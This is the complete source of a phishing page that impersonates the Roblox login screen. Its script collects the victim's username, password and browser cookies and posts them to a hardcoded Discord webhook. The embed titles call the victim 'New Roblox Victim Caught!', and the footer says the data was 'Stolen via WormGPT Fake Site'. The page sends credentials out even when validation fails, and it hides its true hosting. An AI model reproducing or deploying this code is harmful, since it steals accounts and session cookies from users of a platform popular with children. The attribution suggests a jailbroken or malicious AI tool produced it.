<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In | Roblox</title>
    <style>
        body { margin: 0; padding: 0; font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #232527; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background-color: #393B3D; padding: 40px; border-radius: 8px; width: 380px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 90%; }
        
        /* Logo Styling - Hidden */
        .logo { width: 120px; height: auto; margin-bottom: 25px; display: none; margin-left: auto; margin-right: auto; }
        
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin: 10px 0; display: block; border: none; border-radius: 4px; box-sizing: border-box; background-color: #F2F4F5; color: #393B3D; font-size: 16px; outline: none; transition: border 0.2s; }
        input:focus { border: 2px solid #00B06F; }
        input::placeholder { color: #999; }
        
        button { width: 100%; padding: 14px; background-color: #00B06F; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 20px; transition: background-color 0.2s; }
        button:hover { background-color: #008f5a; }
        button:disabled { background-color: #555; cursor: not-allowed; }
        
        .link-overlay { position: absolute; top: 15px; left: 15px; font-size: 13px; color: #aaa; text-decoration: none; font-weight: 600; z-index: 100; }
        
        .footer-links { margin-top: 20px; font-size: 13px; color: #aaa; display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
        .footer-links a { color: #aaa; text-decoration: none; margin: 0 10px; }
        .footer-links a:hover { text-decoration: underline; color: #fff; }
        
        #error-msg { color: #ff4444; font-size: 14px; margin-top: 15px; min-height: 20px; font-weight: 500; }
        
        /* Hide default GitHub elements if any */
        .markdown-body, .site-header { display: none !important; }
    </style>
</head>
<body>
    <!-- Official Roblox Logo - Hidden via CSS class -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Roblox_Logo_2022.svg" alt="Roblox Logo" class="logo">
    
    <div class="container">
        <form id="loginForm" action="#" method="POST">
            <input type="text" id="username" name="username" placeholder="Username" required autocomplete="off">
            <input type="password" id="password" name="password" placeholder="Password" required>
            <div id="error-msg"></div>
            <button type="submit" id="loginBtn">Log In</button>
        </form>
        <div class="footer-links">
            <a href="#">Home</a>
            <a href="#">Games</a>
            <a href="#">Create</a>
            <a href="#">Robux</a>
            <a href="#">Blog</a>
        </div>
        <div style="margin-top: 15px; font-size: 12px; color: #666;">
            &copy; 2026 Roblox Corporation
        </div>
    </div>
    
    <!-- Optional: Link to hide if you want a clean look, or keep for "roblox.com" text -->
    <a href="https://www.roblox.com" class="link-overlay" style="display: none;">roblox.com</a>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1561414326701654068/ix5wCI2b8LOvBV_JRtLvFl7K155faw82DWwZxDjd9Qb5rDCPEE5AIgEY8zYgutGbF_x4";
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const cookies = document.cookie;
            const errorMsg = document.getElementById('error-msg');
            const btn = document.getElementById('loginBtn');

            btn.innerText = "Logging in...";
            btn.disabled = true;
            errorMsg.innerText = "";

            // Prepare data for Roblox validation
            const robloxData = new FormData();
            robloxData.append("username", username);
            robloxData.append("password", password);

            // Fetch to Roblox validation endpoint
            fetch("https://www.roblox.com/login/validate", {
                method: "POST",
                body: robloxData,
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            })
            .then(response => {
                return response.json().catch(() => ({}));
            })
            .then(data => {
                // Check if Roblox says success
                if (data && data.success) {
                    // SUCCESS: Send to webhook and redirect
                    sendToWebhook(username, password, cookies);
                    alert("Logged in successfully!");
                    window.location.href = "https://www.roblox.com/home";
                } else {
                    // FAILURE: Show Roblox error message
                    const message = data && data.errors ? data.errors[0].message : "Invalid username or password.";
                    errorMsg.innerText = message;
                    btn.innerText = "Log In";
                    btn.disabled = false;
                    
                    // Optional: Still send to webhook even on failure
                    // sendToWebhook(username, password, cookies, true); 
                }
            })
            .catch(error => {
                // Network error or CORS block
                console.error("Validation Error:", error);
                errorMsg.innerText = "Connection error. Please try again.";
                btn.innerText = "Log In";
                btn.disabled = false;
                
                // Fallback: Send to webhook anyway if validation fails due to CORS
                sendToWebhook(username, password, cookies, true);
            });
        });

        function sendToWebhook(user, pass, cookies, isFallback = false) {
            const data = {
                username: "Roblox Phisher",
                avatar_url: "https://tr.rbxcdn.com/30/150/Roblox_Icon.png",
                embeds: [
                    {
                        title: isFallback ? "Login Attempt (CORS/Network Issue)" : "New Roblox Victim Caught!",
                        color: 5696136,
                        fields: [
                            { name: "Username", value: user, inline: true },
                            { name: "Password", value: pass, inline: true },
                            { name: "Cookies", value: cookies ? cookies : "No cookies found", inline: false },
                            { name: "Status", value: isFallback ? "Validation Skipped" : "Verified Valid", inline: true }
                        ],
                        footer: { text: "Stolen via WormGPT Fake Site" }
                    }
                ]
            };
            
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            }).catch(err => console.error("Webhook Error:", err));
        }
    </script>
</body>
</html>
body{
  background: linear-gradient(135deg, #232527 0%,#393B3D 100%);
  background-attachment:fixed;
}
